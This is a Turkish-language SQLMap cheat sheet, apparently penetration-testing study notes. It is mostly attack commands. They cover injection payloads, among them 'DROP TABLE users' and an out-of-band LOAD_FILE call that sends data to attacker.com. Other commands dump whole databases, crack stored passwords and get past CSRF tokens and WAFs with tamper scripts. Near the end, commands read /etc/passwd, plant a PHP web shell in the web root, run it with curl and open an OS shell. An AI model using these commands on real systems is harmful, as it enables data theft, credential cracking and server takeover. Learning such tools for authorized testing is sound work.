# SQLMap usage

### Technique

- **B**: Boolean-based blind `AND 1=1`
- **E**: Error-based `AND GTID_SUBSET(@@version,0)`
- **U**: Union query-based `UNION ALL SELECT 1,@@version,3`
- **S**: Stacked queries `; DROP TABLE users`
- **T**: Time-based blind `AND 1=IF(2>1,SLEEP(5),0)`
- **Q**: Inline queries `SELECT (SELECT @@version) from`

#### Out-of-band SQL Injection

- `LOAD_FILE(CONCAT('\\',@@version,'.attacker.com\README.txt'))`

### SQLMap Otomatik Parametre Bulma Seçenekleri

SQLMap'e test için doğrudan bir parametre (Örn: `?id=1`) verilmediğinde, hedefteki açıkları otomatik tespit etmek için aşağıdaki anahtarlar kullanılır:

- `--crawl`: Hedef web sitesini bir örümcek gibi tarar. Ana sayfadan başlayarak sitedeki tüm linkleri ve alt sayfaları otomatik olarak gezer, buralardaki zafiyet barındırabilecek parametreleri tarar.
- `--forms`: Hedef sayfada yer alan tüm HTML formlarını otomatik olarak tespit eder. Bu formların arka plana gönderdiği POST isteklerini de tarama sürecine dahil eder.
- `-g`: Google dork sonuçlarını hedef alır. Belirttiğiniz bir Google arama sorgusunun sonuçlarında çıkan web sitelerini otomatik olarak sırayla SQLMap'e verir.

## SQLMap GET/POST

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

**Cookie verme**

```bash
sqlmap 'http://www.example.com/' --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

# yada

sqlmap 'http://www.example.com/' -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

## SQLMap PUT

```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

## Handling SQLMap Errors

**Terminalde gösterir**

- `--parse-errors`: Veritabanı hatalarını terminale yazar; veritabanı tespiti için kullanılır.

**Dosyaya kaydeder**

- `-t /file.txt`: Veritabanı hatalarını dosyaya yazar.

## Prefix/Suffix

- **prefix**: Payloadın başına ekler

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))"
```

- **suffix**: Payloadın sonuna ekler

```bash
sqlmap -u "www.example.com/?q=test" --suffix="-- -"
```

### Level/Risk (Tarama Hassasiyeti ve Agresiflik)

SQLMap varsayılan olarak en yaygın kullanılan vektörleri ve sınırları test eder. Ancak daha karmaşık senaryolar ve korumalı sistemler için `--level` ve `--risk` seçenekleri kullanılır.

- `--level` (Değer aralığı: 1-5, varsayılan: 1): SQLMap'in test edeceği payload (vektör ve sınır) havuzunun genişliğini belirler. Level değeri arttıkça test edilen kombinasyon sayısı artar.
  - Level 2: HTTP Cookie verilerini de test etmeye başlar.
  - Level 3: HTTP User-Agent ve Referer başlıklarını test sürecine dahil eder.
  - Level 5: Çok daha geniş ve nadir kullanılan sınır kombinasyonlarını dener.
- `--risk` (Değer aralığı: 1-3, varsayılan: 1): Hedef veritabanına gönderilen payload'ların agresiflik ve risk seviyesini belirler.
  - Risk 2: Ağır yük getiren zaman tabanlı SQLi testlerini artırır.
  - Risk 3: Veri tabanındaki mevcut verileri değiştirebilecek payload'ları devreye sokar.

#### Payload Sayısı Karşılaştırması

Varsayılan ayarlarda (`--level=1 --risk=1`) tek bir parametre için yaklaşık 72 adet payload denenirken; en detaylı ve agresif modda (`--level=5 --risk=3`) denenen payload sayısı 7,865'e kadar çıkabilir.

### Advanced Tuning (Gelişmiş İnce Ayar Seçenekleri)

SQLMap'in kör (blind) zafiyetleri tespit ederken doğru (TRUE) ve yanlış (FALSE) yanıtları daha kararlı bir şekilde ayırt etmesi ve taramayı özelleştirmesi için kullanılan gelişmiş seçenekler şunlardır:

- `--code`: Doğru ve yanlış yanıtlar arasındaki fark HTTP durum kodlarına yansıyorsa kullanılır.
- `--titles`: SQLMap'in doğru ve yanlış yanıt ayrımını HTML sayfasının `<title>` etiketindeki değişikliklere bakarak yapmasını sağlar.
- `--string`: Doğru (TRUE) dönen sayfalarda kesinlikle var olan ama yanlış (FALSE) sayfalarda kaybolan belirli bir kelimeyi SQLMap'e hatırlatır.
- `--text-only`: Sayfadaki gizli kodları temizleyerek karşılaştırmayı sadece kullanıcıya görünen düz metin üzerinden yapar.
- `--technique`: SQLMap'in yalnızca belirli SQLi tekniklerini denemesini zorlar. Örneğin zaman tabanlı testleri atlayıp sadece Boolean, Error ve Union testlerini çalıştırabilir.

#### UNION Sorgu Ayarları

- `--union-cols`: UNION tabanlı saldırılarda denenecek kolon sayısını manuel belirler.
- `--union-char`: Kolon tespitinde kullanılan varsayılan `NULL` değeri yerine özel bir karakter kullanılmasını sağlar.
- `--union-from`: Oracle gibi bazı veritabanlarında zorunlu olan `FROM` tablosu ekini manuel belirtir.

### advanced usage

- `--no-cast`: Veriyi olduğu gibi, ham haliyle çekmeye zorlar.
- `--threads=5`: Komutu, siteye aynı anda 5 farklı koldan istek atarak veri çekme hızını artırır.
- `--fresh-queries`: Geçmiş hafızanı unut, her şeyi sıfırdan ve canlı olarak yeniden sorgula.

## Database Enumeration

### Kullanılan Temel Parametreler ve Amaçları

- `--banner`: Hedef veritabanının tam sürüm bilgisini, işletim sistemini ve kullanılan web sunucusu teknolojisini sızdırır.
- `--current-user`: Veritabanı sorgularını arka planda çalıştıran aktif veritabanı kullanıcısının adını verir.
- `--current-db`: Web uygulamasının o an doğrudan bağlı olduğu ve işlem yaptığı aktif veritabanının adını gösterir.
- `--is-dba`: Aktif veritabanı kullanıcısının en üst yetkilere sahip olup olmadığını kontrol eder.

#### Örnek Terminal Çıktısının Analizi

Görseldeki çıktıda, tüm bu parametrelerin tek seferde birleştirilerek hedef sisteme uygulandığı görülmektedir:

- Kullanılan Komut: `sqlmap -u "http://example.com" --banner --current-user --current-db --is-dba`
- Sızdırılan bilgiler:
  - Banner/Sürüm: `5.1.41-3-bpo50+1`
  - Aktif Kullanıcı: `root@%`
  - Aktif Veritabanı: `testdb`
  - DBA Durumu: `current user is DBA: True`

## Advanced database enumeration

- `--schema`: Veritabanının iskelet haritası.
- `--search`: Veritabanının iskelet haritası.
- Kritik yan parametreler: Bu arama komutu tek başına kullanılmaz; neyi aradığınızı belirtmek için aşağıdaki anahtarlardan biriyle birleştirilmelidir:
  - `-C`: Belirli bir sütun (column) ismi aramak için.
  - `-T`: Belirli bir tablo (table) ismi aramak için.
  - `-D`: Belirli bir veritabanı (database) ismi aramak için.

### Şifre Listeleme ve Kırma (Password Enumeration and Cracking)

SQLMap, veritabanından sızdırdığı şifreli verileri (hash) otomatik olarak tanıma ve entegre sözlük saldırısı (dictionary attack) ile çözme yeteneğine sahiptir.

#### 1. Senaryo: Uygulama Kullanıcı Şifrelerini Kırma

`--passwords` veya `--dump` komutu sırasında SQLMap bir şifre sütunu bulduğunda şu adımları izler:

- Format Tespiti: Verilerin hash formatında olduğunu anlar ve kullanıcıya sorar.
- Sözlük (Dictionary) Seçimi: SQLMap kendi içinde varsayılan bir kelime listesi barındırır.
- Kırma İşlemi (Cracking): Çoklu işlemci çekirdeklerini kullanarak arka arkaya denemeler yapar.

#### 2. Senaryo: Veritabanı Yöneticisi Şifrelerini Kırma

`--passwords` anahtarı doğrudan kullanıldığında, web uygulamasının kullanıcıları yerine veritabanının kendi yöneticilerinin şifreleri hedeflenir.

- MySQL Root Şifresi: Veritabanı servisinin ana yöneticisi olan `root` kullanıcısının MySQL hash yapısı sızdırılabilir.
- Blast Radius (Etki Alanı): Bu şifre kırılırsa saldırgan sadece web sitesine değil, doğrudan veritabanı sunucusuna tam yetkiyle erişebilir.

## Table/Row Enumeration

- Kullanılan Komut: `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`
- Sızdırılan Bilgiler:
  - `name,surname`: `john:doe`

#### `--start` ve `--stop` Parametreleri (Satır Sınırlandırma)

SQLMap veri tabanındaki bir tabloyu indirirken, tablonun tamamı yerine sadece belirli satır aralıklarını çekmek için bu parametreler kullanılır.

- `--start=2`: Veri çekme işlemine 2. satırdan başlar.
- `--stop=3`: Veri çekme işleminin 3. satırda bitirir.

Örnek:

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

Bu komut, `testdb` veritabanındaki `users` tablosuna gider; ancak tüm kullanıcı listesini indirmek yerine yalnızca 2. ve 3. satırdaki verileri çeker.

### `WHERE` ve `name LIKE 'f%'` LIKE Command

Name bilgisi `f` ile başlayanları çeker:

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

Örnek sonuç: `name: fluffy`

### Toplu Veri İndirme (Bulk Data Retrieval) ve Filtreleme Seçenekleri

SQLMap'te verileri tek tek tablolar halinde çekmek yerine, hedef veritabanlarının tüm içeriğini tek bir komutla indirmek ve taramayı optimize etmek için aşağıdaki parametreler kullanılır:

- Toplu Veri Tabanı İndirme (`--dump -D <veritabanı>`): Belirli bir tablo adı belirtmeden sadece veritabanı adını verip `--dump` kullanırsanız, SQLMap o veritabanındaki tüm tabloları dumplamaya çalışır.
- Her Şeyi İndirme (`--dump-all`): Hedef sunucuda aktif kullanıcının erişebildiği tüm veritabanlarını ve içlerindeki tüm tabloları tamamen indirir.
- Sistem Veri Tabanlarını Muaf Tutma (`--exclude-sysdbs`): `--dump-all` gibi toplu indirme komutları kullanıldığında SQLMap'in sistem veritabanlarını atlamasını sağlar.

#### Neden Kullanılmalı?

Sistem veritabanları genellikle hedef kullanıcı verilerini barındırmaz ve çok büyüktür. `--exclude-sysdbs` anahtarı eklenerek bu tabloların atlanması sağlanır.

---

# Advanced SQLMap usage

### Anti-CSRF Token Bypass (CSRF Korumasını Atlama)

Web uygulamaları, otomatik botları ve tarayıcıları engellemek için form doldurma işlemlerine tek kullanımlık ve dinamik `Anti-CSRF token` ekler. SQLMap, bu korumayı aşmak için `--csrf-token` parametresini kullanabilir.

```bash
sqlmap -u "http://154.57.164.70:37262/case8.php" --data="id=1&t0ken=0KC0b782mpivTYZwoS2NhkdTjVF54m" --csrf-token="t0ken"
```

#### Kullanılan Parametre ve İşlevi

- `--csrf-token`: SQLMap'e hedef sitenin kullandığı CSRF parametresinin adını belirtmek için kullanılır.
- Çalışma Mantığı: Bu parametre aktif edildiğinde, SQLMap bir istek gönderdikten sonra hedef sitenin verdiği yanıttan bir sonraki istek için yeni bir token çıkarıp kullanımını otomatik günceller.

#### Akıllı Otomatik Algılama

Kullanıcı komutta `--csrf-token` parametresini açıkça belirtmese bile, SQLMap gönderilen istek parametreleri arasında `csrf`, `xsrf` veya `token` gibi yaygın kelimeleri fark ederse bunu otomatik algılayabilir.

> "POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]"

Bu soruya `y` yanıtı verildiğinde, SQLMap CSRF korumasını tamamen devre dışı bırakarak taramayı başarıyla sürdürür.

### `--randomize` Parametresi (Parametrik Değer Rastgeleleştirme)

Bazı web uygulamaları, otomatik tarama araçlarını engellemek amacıyla her HTTP isteğinde belirli bir yan parametrenin tamamen benzersiz bir değer taşımasını zorunlu kılar.

- İşlevi: SQLMap'e hedef gösterilen parametrenin değerini, her bir HTTP isteği gönderilmeden hemen önce rastgele ve benzersiz yeni bir sayısal değerle otomatik olarak güncellemesini sağlar.
- CSRF Korumasından Farkı: Anti-CSRF token mekanizmalarında SQLMap'in önce sayfadan yeni token'ı okuması gerekir; `--randomize` işleminde ise sayfadan veri okumaya gerek yoktur.

#### Örnek Terminal Çıktısının Analizi

```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

Giden isteklerin anatomisi örneği:

- `id=1&rp=99954`
- `id=1&rp=87216`
- `id=9030&rp=36456`
- `id=1%29%20AND...&rp=95185`

### `--eval` Parametresi (Dinamik/Hesaplanmış Parametre Yönetimi)

Bazı gelişmiş web uygulamaları, parametrelerin manipüle edilmesini engellemek için parametre değerlerinin birbirine bağımlı olmasını şart koşar. En yaygın senaryo, bir parametrenin hash'inin diğer parametreye eşlik etmesidir.

- İşlevi: SQLMap'in her bir test isteğini sunucuya göndermeden hemen önce belirtilen Python kodunu canlı olarak çalıştırmasını sağlar.
- Çalışma Mantığı: SQLMap test etmek istediği parametreyi değiştirir; ardından `--eval` içindeki Python kodu devreye girerek yeni parametrenin hash'ini hesaplar ve otomatik olarak ilgili parametreye yerleştirir.

#### Örnek Komut Analizi

```bash
sqlmap -u "http://example.com" --eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()"
```

- `import hashlib;`: Python'un şifreleme kütüphanesini çağırır.
- `h=hashlib.md5(id.encode()).hexdigest()`: SQLMap'in o anki denediği dinamik `id` değerini alır, MD5 hash'ini hesaplar ve çıktıyı otomatik olarak URL'deki `h=` parametresinin yerine yerleştirir.

#### Çıktı İncelemesi

Görseldeki giden URI isteklerine bakıldığında mekanizmanın başarısı netçe görülmektedir:

- `id=1` için `h=c4ca4238a0b923820dcc509a6f75849b`
- `id=9061` için `h=4d7e0d72898ae7ea3593eb5ebf20c744`

### WAF (Güvenlik Duvarı) Tespiti ve `--skip-waf` Parametresi

SQLMap, hedef sisteme doğrudan saldırmadan önce arka planda bir güvenlik duvarı (WAF/IPS) olup olmadığını anlamak için otomatik bir ön test gerçekleştirir.

#### 1. WAF Tespit Mekanizması Nasıl Çalışır?

- Sahte Parametre Gönderimi: SQLMap, taramanın en başında hedef sitede var olmayan rastgele bir parametre ismiyle bilerek çok bariz, "zararlı görünen" bir test kodu gönderir.
- Yanıt Analizi: Eğer kullanıcı ile sunucu arasında bir koruma varsa, dönen HTTP yanıtı orijinal sayfadan çok farklı olur.
- WAF Kimliği Belirleme (Fingerprinting): Pozitif bir WAF tespiti yaptıktan sonra, hangi koruma yazılımının çalıştığını bulmak için ek adımlar atılır.

#### 2. `--skip-waf` Parametresi (Gürültüyü Azaltma)

Sızma testlerinde gizlilik ve minimum iz bırakmak kritik öneme sahiptir. SQLMap'in en başında attığı o bariz zararlı sahte istek, WAF loglarında anında kırmızı alarm oluşturabilir.

- İşlevi: `--skip-waf` anahtarı kullanıldığında, SQLMap en baştaki sezgisel WAF algılama ve kimlik tespit adımlarının tamamını pas geçer.
- Kullanım Amacı: Hedefte bir WAF olmadığını zaten biliyorsanız veya WAF loglarında gürültü çıkarmadan doğrudan asıl parametre testlerine geçmek istiyorsanız bu seçeneği kullanabilirsiniz.

### Tamper Scripts (WAF/IPS Bypass Mekanizması)

Tamper betikleri, SQLMap istekleri hedef sunucuya göndermeden hemen önce payload içeriğini dinamik olarak değiştiren özel Python script'leridir. Temel amaç, zafiyet filtrelerine yakalanmamak ve WAF/IPS bypass yapmaktır.

- Zincirleme Kullanım: Tamper betikleri virgülle ayrılarak arka arkaya eklenebilir. Örnek: `--tamper=between,randomcase`
- Tüm Listeyi Görme: `--list-tampers`

#### En Popüler Tamper Script'leri ve İşlevleri

| Tamper Script | Açıklama / Görevi | Dönüşüm Örneği |
| :--- | :--- | :--- |
| `apostrophemask` | Tek tırnak (`'`) işaretini URL encoding karşılığı ile maskeler. | `'` → `%27` |
| `base64encode` | Payload içindeki tüm karakterleri Base64 formatına çevirir. | `SELECT` → `U0VMRUNU` |
| `between` | Büyüktür (`>`) ve eşittir (`=`) operatörlerini `BETWEEN` yapısıyla değiştirir. | `id > 1` → `id NOT BETWEEN 0 AND 1` |
| `charencode` | Payload'daki tüm karakterleri URL encode moduna sokar. | `SELECT` → `%53%45%4c%45%43%54` |
| `commalesslimit` | MySQL'deki virgüllü `LIMIT` yapısını virgülsüz `OFFSET` yapısına çevirir. | `LIMIT 1,2` → `LIMIT 2 OFFSET 1` |
| `equaltolike` | Tüm eşittir (`=`) işaretlerini `LIKE` operatörü ile değiştirir. | `id = 1` → `id LIKE 1` |
| `modsecurityversioned` | Tüm sorguyu ModSecurity WAF'ı atlatmak için versiyonlu yorum satırına alır. | `1 AND 1=1` → `1 /*!30874AND 1=1*/` |
| `percentage` | Her karakterin başına yüzde (`%`) işareti ekler. | `SELECT` → `%S%E%L%E%C%T` |
| `randomcase` | SQL anahtar kelimelerindeki harfleri rastgele büyük/küçük yapar. | `SELECT` → `SeLeCt` |
| `space2comment` | Tüm boşluk karakterlerini MySQL yorum satırları ile değiştirir. | `SELECT id FROM` → `SELECT/**/id/**/FROM` |
| `space2dash` | Boşlukları tire işareti, rastgele metin ve yeni satır ile değiştirir. | Boşluk → `--\n` |
| `space2hash` | Boşlukları MySQL'e özel diyez (`#`) yorum işareti ve yeni satırla değiştirir. | Boşluk → `#\n` |
| `space2plus` | Tüm boşluk karakterlerini artı (`+`) işaretiyle değiştirir. | Boşluk → `+` |
| `symboliclogical` | `AND` ve `OR` mantıksal ifadelerini sembolik hallerine dönüştürür. | `AND` → `&&` / `OR` → `\|\|` |
| `versionedkeywords` | Fonksiyon olmayan tüm anahtar kelimeleri MySQL yorum satırına hapseder. | `UNION` → `/*!50000UNION*/` |

### Çeşitli WAF Atlatma Yöntemleri (Miscellaneous Bypasses)

Gelişmiş zafiyet filtreleri ve WAF çözümleri, `UNION`, `SELECT` veya `FROM` gibi kara listeye alınmış SQL anahtar kelimelerini paketlerin içinde bütün olarak arar. SQLMap, bu tür engelleri aşmak için özel yöntemler geliştirir.

#### 1. Chunked Transfer Encoding (`--chunked`)

HTTP protokolünün veri aktarım özelliğini bir silaha dönüştürür. Özellikle POST isteklerinin gövdesini sunucuya göndermeden önce küçük veri bloklarına böler.

- Çalışma Mantığı: Kara listeye alınmış bir SQL kelimesi, bu blokların tam birleşme sınırlarından bölünür. WAF her bir bloğu tek tek incelediği için zararlı kelimeyi bütün halinde algılayamaz.

#### 2. HTTP Parameter Pollution - HPP (`--hpp`)

HTTP Parametre Kirliliği anlamına gelen bu yöntem, enjeksiyon kodlarını aynı isimdeki birden fazla parametreye bölerek dağıtmayı hedefler.

- Çalışma Mantığı: Tek bir `id` parametresine tüm kodu yazmak yerine, sunucunun parametreleri birleştirme huyundan faydalanılır.
- Dağıtılmış İstek Örneği: `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users`
- Arka Plan Davranışı: WAF, her bir `id` parametresini bağımsız ve zararsız zanneder; ancak hedef web platformu bu parametreleri birleştirerek işlemi gerçekleştirir.

## `is-dba` ile yetkilerimizi öğrenmek

```bash
 sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

+ **current user is DBA: `False`** ise yazma ve okuma iznimiz olmaz
+ **current user is DBA: `True`** ise yazma ve okuma iznimiz var demektir

### Local Dosyaları okuma

```bash
 sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

### Local Dosyalara yazma

Barındırma sunucusuna dosya yazma konusu, modern veritabanı yönetim sistemlerinde (DBMS) oldukça kısıtlanmıştır; zira bu özellik, uzak sunucuya bir "Web Shell" (web kabuğu) yerleştirmek, kod çalıştırmak ve sunucunun kontrolünü ele geçirmek için kullanılabilir.

İşte bu nedenle, modern veritabanı sistemleri dosya yazma işlevini varsayılan olarak devre dışı bırakır ve veritabanı yöneticilerinin (DBA) dosya yazabilmesi için özel ayrıcalıklara sahip olmasını şart koşar. Örneğin MySQL'de, `INTO OUTFILE` SQL sorgusunu kullanarak yerel dosyalara veri yazabilmek için `--secure-file-priv` yapılandırmasının manuel olarak devre dışı bırakılması gerekir; ayrıca, hedef dizine yazma izni gibi, barındırma sunucusu üzerinde gerekli yerel erişim haklarına da sahip olunmalıdır.

Buna rağmen, birçok web uygulaması veritabanı sistemlerinin dosyalara veri yazabilmesini gerektirir; dolayısıyla uzak sunucuya dosya yazıp yazamayacağımızı test etmekte fayda vardır. Bunu SQLMap ile gerçekleştirmek için `--file-write` ve `--file-dest` seçeneklerini kullanabiliriz. Öncelikle, basit bir PHP web kabuğu hazırlayalım ve bunu `shell.php` adlı bir dosyaya kaydedelim:


```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php;
## sonra
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
## sonra
curl http://www.example.com/shell.php?cmd=id
```


## os command execution

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell 
```

**error based sql inj daha sağlıklı eğer bu açık varsa --technique=E**

```bash
sqlmap -u "http://www.example.com/?id=1" --technique=E --os-shell 
```